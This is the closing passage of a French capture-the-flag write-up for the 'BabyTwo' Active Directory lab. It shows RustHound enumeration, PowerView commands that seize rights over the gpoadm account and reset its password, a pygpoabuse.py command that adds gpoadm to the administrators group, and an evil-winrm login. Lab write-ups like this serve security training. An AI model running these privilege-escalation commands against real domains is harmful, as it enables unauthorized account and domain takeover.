+<h2 id="bloodhound">Bloodhound</h2>
+<p>Ensuite avec [rusthound](<a href="https://github.com/NH-RED-TEAM/RustHound" target="_blank" rel="noopener noreffer ">GitHub - NH-RED-TEAM/RustHound: Active Directory data ingestor for BloodHound Legacy written in Rust. 🦀</a>), je récupère les relations entre les différents objets du domaine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo   1146s
+</span></span><span class="line"><span class="cl">❯ rusthound -d baby2.vl -u Carl.Moore -p Carl.Moore
+</span></span><span class="line"><span class="cl">---------------------------------------------------
+</span></span><span class="line"><span class="cl">Initializing RustHound at 22:56:44 on 12/23/25
+</span></span><span class="line"><span class="cl">Powered by g0h4n from OpenCyber
+</span></span><span class="line"><span class="cl">---------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:44Z INFO  rusthound<span class="o">]</span> Verbosity level: Info
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:44Z INFO  rusthound::ldap<span class="o">]</span> Connected to BABY2.VL Active Directory!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:44Z INFO  rusthound::ldap<span class="o">]</span> Starting data collection...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::ldap<span class="o">]</span> All data collected <span class="k">for</span> NamingContext <span class="nv">DC</span><span class="o">=</span>baby2,DC<span class="o">=</span>vl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::parser<span class="o">]</span> Starting the LDAP objects parsing...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::parser::bh_41<span class="o">]</span> MachineAccountQuota: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::parser<span class="o">]</span> Parsing LDAP objects finished!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::checker<span class="o">]</span> Starting checker to replace some values...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::checker<span class="o">]</span> Checking and replacing some values finished!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">16</span> users parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_users.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">62</span> groups parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_groups.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">1</span> computers parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_computers.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">3</span> ous parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_ous.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">1</span> domains parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_domains.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">2</span> gpos parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_gpos.json created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> <span class="m">21</span> containers parsed!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2025-12-23T21:56:45Z INFO  rusthound::json::maker<span class="o">]</span> .//20251223225645_baby2-vl_containers.json created!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">RustHound Enumeration Completed at 22:56:45 on 12/23/25! Happy Graphing!</span></span></code></pre></div></div>
+<p><code>Nicola.Lamb</code>, membre du groupe <code>legacy</code>, possède les droits <code>WriteOwner</code> et <code>WriteDACL</code> sur le GPO <code>GPO-MANAGEMENT</code> ainsi que sur l&rsquo;utilisateur <code>gpoadm</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-2.png"
+        data-srcset="/images/BabyTwo/BabyTwo-2.png, /images/BabyTwo/BabyTwo-2.png 1.5x, /images/BabyTwo/BabyTwo-2.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-2.png"
+        title="/images/BabyTwo/BabyTwo-2.png" width="979" height="545" /></p>
+<p>Il en est de meme pour l&rsquo;utilisateur <code>Amelia.Griffiths</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-3.png"
+        data-srcset="/images/BabyTwo/BabyTwo-3.png, /images/BabyTwo/BabyTwo-3.png 1.5x, /images/BabyTwo/BabyTwo-3.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-3.png"
+        title="/images/BabyTwo/BabyTwo-3.png" width="872" height="539" /></p>
+<p>Ensuite l&rsquo;utilisateur <code>gpoadm</code> possède les droits <code>GenericAll</code> sur les politiques <code>DEFAULT DOMAIN CONTROLLERS POLICY</code> et <code>DEFAULT DOMAIN POLICY</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-7.png"
+        data-srcset="/images/BabyTwo/BabyTwo-7.png, /images/BabyTwo/BabyTwo-7.png 1.5x, /images/BabyTwo/BabyTwo-7.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-7.png"
+        title="/images/BabyTwo/BabyTwo-7.png" width="1038" height="506" /></p>
+<h2 id="gpo-abuse">GPO Abuse</h2>
+<p>Ce qui me donne le chemin d&rsquo;exploitation suivant :</p>
+<ol>
+<li>Donner tous les droits sur <code>GPOADM</code> à <code>Amelia.Griffiths</code></li>
+<li>Modifier le mot de passe de l&rsquo;utilisateur <code>GPOADM</code></li>
+<li>Ajouter <code>GPOADM</code> dans le groupe <code>administrators</code>.</li>
+</ol>
+<p>Je fais les deux premières étapes depuis mon shell obtenu. Je le ferai en utilisant les commandes <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener noreffer ">PowerView.ps1</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Importer powerview.ps1</span>
+</span></span><span class="line"><span class="cl">import-module ./powerview.ps1
+</span></span><span class="line"><span class="cl"><span class="c1"># Donner tous les droits sur GPOADM à Amelia.Griffiths</span>
+</span></span><span class="line"><span class="cl">add-domainobjectacl -rights <span class="s2">&#34;all&#34;</span> -targetidentity <span class="s2">&#34;gpoadm&#34;</span> -principalidentity <span class="s2">&#34;Amelia.Griffiths&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Créer un mot de passe</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;Password123!&#39;</span> -AsPlainText -Force
+</span></span><span class="line"><span class="cl"><span class="c1"># Attribuer le mot de passe à l&#39;utilisateur GPOADM</span>
+</span></span><span class="line"><span class="cl">set-domainuserpassword gpoadm -accountpassword <span class="nv">$cred</span></span></span></code></pre></div></div>
+<p>Puis à l&rsquo;aide <a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener noreffer ">pygpoabuse.py</a>, je crée une règle qui ajoute <code>GPOADM</code> dans le groupe <code>administrators</code>. Pour cela, je renseigne l&rsquo;ID de la GPO <code>GPO-MANAGEMENT</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ pygpoabuse.py baby2.vl/gpoadm:Password123 -gpo-id <span class="s2">&#34;31B2F340-016D-11D2-945F-00C04FB984F9&#34;</span> -command <span class="s1">&#39;net localgroup administrators gpoadm /add&#39;</span> -f
+</span></span><span class="line"><span class="cl">SUCCESS:root:ScheduledTask TASK_7e11c30d created!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ScheduledTask TASK_7e11c30d created!</span></span></code></pre></div></div>
+<h2 id="shell-1">Shell</h2>
+<p>Comme avec la machine <code>Nanocorp</code>, <code>evil-winrm</code> ne fonctionne pas pour avoir un shell. J&rsquo;utilise alors <a href="https://github.com/adityatelange/evil-winrm-py" target="_blank" rel="noopener noreffer ">evil-winrm.py</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/adityatelange/evil-winrm-py
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> evil-winrm-py
+</span></span><span class="line"><span class="cl">pip install .</span></span></code></pre></div></div>
+<p>Je me connecte ensuite et je récupère le second flag.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i dc.baby2.vl -u gpoadm -p <span class="s1">&#39;Password123!&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-8.png"
+        data-srcset="/images/BabyTwo/BabyTwo-8.png, /images/BabyTwo/BabyTwo-8.png 1.5x, /images/BabyTwo/BabyTwo-8.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-8.png"
+        title="/images/BabyTwo/BabyTwo-8.png" width="774" height="435" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-27</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/babytwo/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/babytwo/" data-title="BabyTwo" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,Login script abuse,GPO Abuse"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/login-script-abuse/">Login Script Abuse</a>,&nbsp;<a href="/tags/gpo-abuse/">GPO Abuse</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/breach/" class="prev" rel="prev" title="Breach"><i class="fas fa-angle-left" aria-hidden="true"></i>Breach</a>
+            <a href="/intercept/" class="next" rel="next" title="Intercept">Intercept<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
